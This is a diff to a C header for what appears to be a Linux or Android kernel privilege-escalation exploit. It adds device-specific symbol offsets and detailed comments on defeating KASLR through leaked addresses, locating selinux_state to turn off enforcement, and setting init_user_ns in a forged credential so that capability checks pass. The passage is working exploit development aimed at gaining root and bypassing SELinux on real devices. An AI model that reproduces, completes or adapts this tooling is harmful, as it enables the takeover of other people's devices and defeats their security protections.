@@ -22,6 +22,40 @@ struct kernel_offsets {
   uint64_t off_configfs_read_iter, off_configfs_bin_write_iter;
   uint64_t off_copy_splice_read, off_noop_llseek, off_cap_capable_active;
   uint64_t off_slide_nfulnl_logger, off_slide_loggers_0_1, off_slide_boot_id;
+  /* Device-build addresses (anchor-relative = kaslr_base-relative).
+   * The device kernel (ThinLTO/clang-17) has .text+.rodata ~7.5MB larger
+   * than the reference vmlinux, shifting the whole .data/.bss region, so
+   * the reference-table offsets above are NOT device-valid for data
+   * symbols (they point into .rodata on the device). The *_device fields
+   * carry corrected addresses derived from the pstore boot-log section
+   * layout + the reference offset-in-section, cross-verified on device
+   * via perf-leaked symbol pairs. 0 = unknown. */
+  /* Device section map (pstore boot log, stable per build; anchor =
+   * kaslr_base = device _text - 0x80000):
+   *   .text  anchor+0x0080000 .. +0x11E0000
+   *   .rodata anchor+0x11E0000 .. +0x1830000
+   *   .init  anchor+0x1830000 .. +0x19C0000
+   *   .data  anchor+0x19C0000 .. +0x1BC6808
+   *   .bss   anchor+0x1BC6808 .. +0x1CF2144
+   * selinux_state: the leak found the selinux_avc/selinux_state pair
+   * (reference .bss+0x3FEA0 / +0x416C8, delta 0x1828 EXACTLY) at
+   * anchor+0x1C07708 / +0x1C08F30 - the SAME 0x1828 delta, i.e. the
+   * .bss prefix shifted uniformly +0x1060 from the reference. The naive
+   * boot-log derivation (0x1C07ED0) missed that shift and landed inside
+   * selinux_avc (an empty avc_cache bucket - survived, enforce stayed 1). */
+  uint64_t off_selinux_enforcing_device;
+  /* Device &init_user_ns = boot-log .data start (0x19C0000) + reference
+   * offset-in-.data (0x2B080). The .data internal layout is preserved
+   * (zero shift): the leak candidate anchor+0x19C9600 is exactly
+   * mount_lock (reference .data+0x9600). Needed as fake_cred->user_ns:
+   * cap_capable() must match ns == cred->user_ns on the first
+   * iteration or every capable() call dies at
+   * `if (ns == &init_user_ns) return -EPERM`. */
+  uint64_t off_init_user_ns_device;
+  /* REFERENCE-vmlinux &init_user_ns (NOT device-valid). Kept only as the
+   * setpriority-storm trigger for the nice(-20) preemption shield and
+   * the candidate census diagnostic. */
+  uint64_t off_init_user_ns;
 
   /* UMH root: workqueue symbol offsets (0 = not available for this kernel) */
   uint64_t off_system_unbound_wq;
